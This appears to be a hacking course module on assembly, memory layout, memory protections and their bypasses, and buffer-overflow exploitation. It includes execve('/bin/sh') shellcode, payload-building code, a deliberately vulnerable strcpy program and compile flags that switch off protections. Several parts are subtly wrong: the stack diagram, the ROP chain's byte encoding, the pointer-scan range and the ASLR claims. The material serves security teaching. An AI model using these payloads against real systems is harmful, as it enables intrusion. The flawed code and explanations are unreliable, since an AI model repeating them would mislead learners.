# Module 3: System Architecture & Memory Fundamentals

## 3.1 x86/x64 Assembly Basics

### Why Assembly Matters for Hacking
- **Shellcode**: Exploit payloads written in assembly
- **ROP Gadgets**: Use existing code to bypass protections
- **Reverse Engineering**: Understand malware and binaries
- **Buffer Overflow**: Overwrite memory with assembly instructions

### x86 Architecture Overview

```python
# CPU Registers (32-bit)
registers_x86 = {
    "EAX": "Accumulator (return values)",
    "EBX": "Base (data pointer)",
    "ECX": "Counter (loop counter)",
    "EDX": "Data",
    "ESI": "Source index",
    "EDI": "Destination index",
    "EBP": "Base pointer (stack frame)",
    "ESP": "Stack pointer"
}

# x86-64 Additional Registers
registers_x64 = {
    "RAX": "64-bit version of EAX",
    "RBX": "64-bit version of EBX",
    "RCX": "64-bit version of ECX",
    "RDX": "64-bit version of EDX",
    "R8-R15": "Additional 64-bit registers"
}

# Calling Conventions (important for exploitation!)
calling_conventions = {
    "x86 cdecl": {
        "Args passed via": "Stack (right-to-left)",
        "Return value in": "EAX",
        "Caller cleans": "Stack"
    },
    "x64 System V": {
        "Args passed via": "RDI, RSI, RDX, RCX, R8, R9",
        "Return value in": "RAX, RDX",
        "Caller cleans": "Stack"
    },
    "x64 Windows": {
        "Args passed via": "RCX, RDX, R8, R9",
        "Return value in": "RAX",
        "Caller cleans": "Stack"
    }
}

# Basic x86 Instructions
asm_instructions = {
    "MOV": "Move data: MOV EAX, EBX (EAX = EBX)",
    "ADD": "Add: ADD EAX, 5 (EAX += 5)",
    "SUB": "Subtract: SUB ECX, 1 (ECX -= 1)",
    "JMP": "Jump: JMP 0x401000 (goto 0x401000)",
    "CALL": "Function call: CALL 0x401234",
    "RET": "Return from function",
    "PUSH": "Push to stack: PUSH EAX",
    "POP": "Pop from stack: POP EBX",
    "NOP": "No operation (0x90 byte)",
    "INT": "Interrupt: INT 0x80 (Linux syscall)",
    "SYSCALL": "System call (x64 Linux)"
}
```

### Simple Shellcode Analysis

```python
# Example: x86 Linux execve("/bin/sh") shellcode
shellcode_x86 = bytes([
    0x31, 0xc0,                    # xor eax, eax
    0x50,                          # push eax
    0x68, 0x2f, 0x2f, 0x73, 0x68, # push "//sh"
    0x68, 0x2f, 0x62, 0x69, 0x6e, # push "/bin"
    0x89, 0xe3,                    # mov ebx, esp
    0x50,                          # push eax
    0x89, 0xe2,                    # mov edx, esp
    0x53,                          # push ebx
    0x89, 0xe1,                    # mov ecx, esp
    0xb0, 0x0b,                    # mov al, 0x0b (execve syscall #)
    0xcd, 0x80                     # int 0x80
])

def analyze_shellcode(shellcode):
    """
    Disassemble and analyze shellcode
    """
    print(f"Length: {len(shellcode)} bytes")
    print(f"Hex: {shellcode.hex()}")
    
    # To properly disassemble, use: capstone or pyda
    # pip install capstone
    
    try:
        from capstone import *
        md = Cs(CS_ARCH_X86, CS_MODE_32)
        
        for instr in md.disasm(shellcode, 0x0):
            print(f"0x{instr.address:04x}: {instr.mnemonic} {instr.op_str}")
    except ImportError:
        print("Install capstone for disassembly: pip install capstone")

def check_for_null_bytes(shellcode):
    """
    Null bytes break C string operations in exploits
    Must be removed from shellcode
    """
    if b'\x00' in shellcode:
        print("[-] Contains null bytes! Not suitable for C string overflow")
        indices = [i for i, b in enumerate(shellcode) if b == 0]
        print(f"Null bytes at: {indices}")
        return False
    else:
        print("[+] No null bytes - safe for string operations")
        return True
```

---

## 3.2 Stack & Heap Memory Layout

### Process Memory Layout

```
(Higher Addresses)
┌─────────────────┐
│   Kernel Space  │ (Privileged)
├─────────────────┤
│   Stack         │ ↓ (grows down)
│   (Local vars)  │
├─────────────────┤
│   Heap          │ ↑ (grows up)
│   (Dynamic mem) │
├─────────────────┤
│   .bss          │ (Uninitialized data)
├─────────────────┤
│   .data         │ (Initialized data)
├─────────────────┤
│   .text         │ (Code)
└─────────────────┘
(Lower Addresses)
```

### Stack in Memory

```python
def understand_stack():
    """
    Stack: LIFO (Last In First Out)
    - Function arguments pushed
    - Return address pushed
    - Local variables
    - ESP/RSP points to top
    - EBP/RBP points to frame base
    """
    
    # Function call in C:
    # void vulnerable(char *input) {
    #     char buffer[64];        // 64 bytes on stack
    #     strcpy(buffer, input);  // UNSAFE: can overflow!
    # }
    
    # Stack layout for vulnerable():
    stack_layout = """
    [Lower address]
    ┌─────────────────────┐
    │  Return Address     │ <- EBP points here
    ├─────────────────────┤
    │  Old EBP            │
    ├─────────────────────┤
    │  buffer[0..63]      │ <- ESP points here initially
    │  buffer overflow -> │ <- Overflow here overwrites EBP/Return Addr
    └─────────────────────┘
    [Higher address]
    """
    print(stack_layout)

def stack_overflow_principle():
    """
    Classic Buffer Overflow Attack:
    
    If buffer is 64 bytes and we write 100 bytes:
    - First 64 bytes fill buffer
    - Next 4 bytes overwrite old EBP
    - Next 4 bytes overwrite return address
    - Program jumps to our shellcode!
    """
    
    # In Python, simulate this:
    buffer_size = 64
    eip_offset = buffer_size + 4  # EBP is 4 bytes
    
    shellcode = b"\x90" * 20  # NOP sled
    shellcode += b"\xcc" * 20  # INT3 breakpoint
    
    overflow = b"A" * buffer_size  # Fill buffer
    overflow += b"B" * 4          # Overwrite EBP
    overflow += b"\x08\x04\x40\x00"  # New return address (little-endian)
    overflow += shellcode
    
    print(f"Overflow payload size: {len(overflow)}")
```

### Heap Allocation

```python
def heap_memory():
    """
    Heap: Dynamic memory allocation
    - malloc() returns pointer to heap memory
    - Fragmentation can occur
    - Use-after-free, double-free bugs here
    """
    
    # C code example:
    # int *ptr = malloc(4);  // Allocate 4 bytes on heap
    # *ptr = 0x41414141;     // Write to allocated memory
    # free(ptr);             // Release memory
    # *ptr = 0x42424242;     // USE-AFTER-FREE! ptr no longer valid!
    
    class HeapChunk:
        def __init__(self, size, data=None):
            self.size = size
            self.data = data or b'\x00' * size
            self.is_free = False
    
    # Heap chunks have metadata
    heap_structure = {
        "Allocated chunk": {
            "Size": "8 bytes (size + flags)",
            "Data": "Requested size",
            "Prev/Next": "Pointers (free list)"
        }
    }

def double_free_vulnerability():
    """
    Double-free: Freeing same pointer twice
    
    Can corrupt heap metadata and achieve code execution
    """
    # Pseudocode:
    # ptr = malloc(128);
    # free(ptr);
    # free(ptr);  // DOUBLE-FREE!
    
    # Consequences:
    # - Same memory allocated to two different objects
    # - Modifications to first affect second
    # - Can achieve arbitrary write
    pass

def use_after_free():
    """
    Use-after-free: Using pointer after freeing
    
    Accessing freed memory can:
    - Read sensitive data
    - Modify freed objects
    - Achieve code execution
    """
    pass
```

---

## 3.3 Calling Conventions & Function Prologue/Epilogue

### x86 cdecl Calling Convention

```
Function Call:
┌─────────────────────────────┐
│ CALLER CODE                 │
│ push arg3                   │
│ push arg2                   │
│ push arg1                   │
│ call function               │  <- Pushes return address
│ add esp, 12                 │  <- Caller cleans stack
└─────────────────────────────┘

Function Prologue (Start):
┌─────────────────────────────┐
│ FUNCTION CODE               │
│ push ebp                    │  <- Save old frame pointer
│ mov ebp, esp                │  <- Create new frame
│ sub esp, 0x20               │  <- Allocate local variables
└─────────────────────────────┘

Stack at function start:
[esp+20] arg3
[esp+16] arg2
[esp+12] arg1
[esp+8]  return address
[esp+4]  old ebp
[esp]    local vars
```

```python
def function_prologue_epilogue():
    """
    Understanding stack frames is critical for:
    1. Stack-based buffer overflow exploitation
    2. Return-oriented programming (ROP)
    3. Stack pivoting
    """
    
    asm_prologue = """
    push ebp           ; Save old frame pointer
    mov ebp, esp       ; Create new frame
    sub esp, 32        ; Allocate 32 bytes for locals
    """
    
    asm_epilogue = """
    mov esp, ebp       ; Restore stack pointer
    pop ebp            ; Restore frame pointer
    ret                ; Return to caller
    """
    
    # During exploitation, overwriting return address redirects execution

def exploit_return_address():
    """
    Return-Oriented Programming (ROP):
    - Chain existing code "gadgets"
    - Each gadget ends with ret
    - Overwrites return addresses to chain gadgets
    - Bypasses code execution prevention
    """
    
    # Example ROP chain:
    gadgets = [
        ("0x401000", "pop rdi; ret"),      # Put value in RDI
        ("0x401010", "pop rsi; ret"),      # Put value in RSI
        ("0x401020", "syscall; ret")       # Execute syscall
    ]
    
    # Chain these together by overwriting return addresses
    rop_chain = b""
    for gadget_addr, description in gadgets:
        rop_chain += bytes.fromhex(gadget_addr.replace("0x", ""))
    
    return rop_chain
```

---

## 3.4 Memory Protection Mechanisms

### Address Space Layout Randomization (ASLR)

```python
def aslr_bypass():
    """
    ASLR randomizes memory addresses each execution
    Makes exploits unreliable
    
    Bypass techniques:
    1. Information leak: Read random address
    2. Partial overwrite: Overwrite only last bytes
    3. ROP: Use addresses relative to known points
    """
    
    # Check if ASLR is enabled on Linux
    import subprocess
    
    result = subprocess.run(
        ["cat", "/proc/sys/kernel/randomize_va_space"],
        capture_output=True,
        text=True
    )
    
    aslr_status = int(result.stdout.strip())
    
    if aslr_status == 0:
        print("[+] ASLR disabled - exploits very reliable")
    elif aslr_status == 1:
        print("[!] ASLR partially enabled")
    elif aslr_status == 2:
        print("[-] ASLR fully enabled - exploits harder")
    
    return aslr_status

def information_leak_example():
    """
    Common way to leak ASLR:
    1. Read stack/heap to find pointers
    2. Calculate offset to target function
    3. Use calculated address in exploit
    """
    
    # Example: Format string vulnerability leaks stack
    # printf("%p %p %p");  // Prints stack values
    # Attacker reads output to get libc/heap addresses
    pass

def partial_overwrite_technique():
    """
    ASLR usually keeps page alignment:
    - Only randomizes to 0x1000 boundary
    - Only last 3 bytes randomized on x86-64
    - Can overwrite only those bytes with brute force
    """
    
    base_address = 0x7ffdd000  # Page-aligned
    # With ASLR, only varies by multiple of 0x1000
    possible_addresses = [base_address + (i * 0x1000) 
                         for i in range(256)]
    
    return possible_addresses

def control_flow_guard():
    """
    CFG: Windows protection preventing arbitrary jumps
    - Validates jump/call targets
    - Attacker can't jump to shellcode directly
    - Must use CFG-valid gadgets
    """
    pass

def data_execution_prevention():
    """
    DEP/NX Bit: Makes stack/heap non-executable
    - Shellcode on stack won't execute
    - Bypasses: ROP, ret2libc, JIT spraying
    """
    
    # Bypass techniques:
    bypass_techniques = [
        "Return-to-libc: Call system() from libc",
        "ROP chain: Chain gadgets to execute syscall",
        "JIT spraying: Use JavaScript to create executable memory",
        "Heap spray: Fill heap with code to land in shellcode"
    ]
```

### Stack Canaries

```python
def stack_canaries():
    """
    Canary: Secret value between buffer and return address
    If overwritten, program detects and terminates
    
    Canary value example: 0x0a123456
    """
    
    # Canary values typically have:
    # - 0x00 at end (stops string operations from overwriting)
    # - Random middle bytes
    
    def bypass_canary():
        """
        Canary bypass techniques:
        1. Leak canary value then use it
        2. Brute force (byte by byte)
        3. Overflow without touching canary
        4. Use information leak
        """
        
        # Example: Format string leaks canary
        # Attacker sees: 0x0a123456
        # Uses same value in payload
        pass

def stack_canary_values():
    """
    Common canary implementations
    """
    import random
    
    # Terminator canary (stops string operations)
    canary = b'\x00\x0a\x0d\xff'  # Null, newline, carriage return, 0xff
    
    # Random canary
    canary = bytes([random.randint(0, 255) for _ in range(4)])
    
    return canary
```

---

## 3.5 Debugging & Memory Analysis Tools

### Using GDB for Exploit Development

```python
def gdb_usage_guide():
    """
    GDB: Primary tool for exploit development
    """
    
    gdb_commands = {
        "gdb ./program": "Launch debugger",
        "r": "Run program",
        "r arg1 arg2": "Run with arguments",
        "b main": "Break at main",
        "b *0x400000": "Break at address",
        "c": "Continue execution",
        "n": "Next instruction",
        "s": "Step into function",
        "finish": "Run until return",
        "x/4x 0x7fffffff0000": "Examine 4 hex values at address",
        "x/4i 0x400000": "Disassemble 4 instructions",
        "print $rax": "Print register value",
        "set $rax = 0x1234": "Modify register",
        "info registers": "Show all registers",
        "backtrace": "Show call stack",
        "disas main": "Disassemble function"
    }

def exploit_debugging_workflow():
    """
    Typical GDB exploit development workflow:
    """
    steps = [
        "1. Set breakpoint at vulnerable function",
        "2. Run with test input",
        "3. Examine stack layout",
        "4. Calculate offset to return address",
        "5. Create payload with exact offset",
        "6. Verify payload overwrites correct location",
        "7. Replace shellcode placeholder",
        "8. Test outside debugger"
    ]
    
    return steps

def pwntools_gdb_integration():
    """
    pwntools simplifies exploit development with GDB
    """
    # pip install pwntools
    
    pwntools_example = """
from pwn import *

# Attach GDB to process
context.log_level = 'debug'
p = process('./vulnerable')

# Send payload and see response
p.sendline(b'A' * 100)
response = p.recv(1024)

print(response)
p.close()

# Or use gdb() to attach debugger
context.arch = 'amd64'
p = gdb.attach(process('./vulnerable'))
"""
```

### Memory Dump Analysis

```python
def analyze_memory_dump(dump_file):
    """
    Analyze memory dump to find:
    - Leaked addresses
    - Shellcode patterns
    - Function pointers
    - Interesting strings
    """
    
    with open(dump_file, 'rb') as f:
        memory = f.read()
    
    # Find pointer patterns (common libc addresses)
    import re
    
    # x86-64 pointers typically start with 0x7f (libc) or 0x55 (PIE)
    potential_pointers = []
    for i in range(len(memory) - 8):
        value = int.from_bytes(memory[i:i+8], 'little')
        if 0x400000 <= value <= 0x800000:  # Typical code address range
            potential_pointers.append((i, hex(value)))
    
    return potential_pointers

def find_rop_gadgets(binary_path):
    """
    Find ROP gadgets for chaining
    """
    # Use ROPgadget tool or:
    import subprocess
    
    try:
        result = subprocess.run(
            ['objdump', '-d', binary_path],
            capture_output=True,
            text=True
        )
        
        # Look for 'ret' instructions and preceding code
        lines = result.stdout.split('\n')
        gadgets = [line for line in lines if 'ret' in line or 'pop' in line]
        
        return gadgets[:10]  # Return first 10
    except FileNotFoundError:
        print("objdump not found")
        return None
```

---

## 3.6 Practice: Build a Buffer Overflow Detector

```python
import struct

def create_vulnerable_binary():
    """
    Create intentionally vulnerable C program for practice
    """
    vulnerable_c = """
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Unsafe: no bounds checking!
    printf("You entered: %s\\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable(argv[1]);
    }
    return 0;
}
"""
    return vulnerable_c

def calculate_offset():
    """
    Find exact offset to overwrite return address
    """
    buffer_size = 64
    saved_ebp = 4
    return_address_offset = buffer_size + saved_ebp
    
    return return_address_offset

def create_exploit_payload(target_address):
    """
    Create buffer overflow payload
    """
    offset = calculate_offset()
    
    nop_sled = b'\x90' * 20
    shellcode = b'\xcc' * 20
    
    payload = b'A' * offset
    payload += struct.pack('<I', target_address)
    payload += nop_sled + shellcode
    
    return payload

# Usage:
# Compile: gcc -fno-stack-protector -z execstack -o vuln vuln.c
# Test: ./vuln $(python3 -c "from solution import *; print(create_exploit_payload(0x401000).decode('latin1'))")
```

---

## Summary
- x86/x64 assembly is essential for shellcode writing
- Stack/heap memory vulnerable to different exploits
- Function prologues/epilogues enable return address overwriting
- Modern protections (ASLR, DEP, canaries) require advanced techniques
- GDB and memory analysis tools are exploitation prerequisites

## Next Steps
- Compile and exploit vulnerable C programs
- Practice with OWASP WebGoat
- Study real malware samples
- Learn ROP chaining
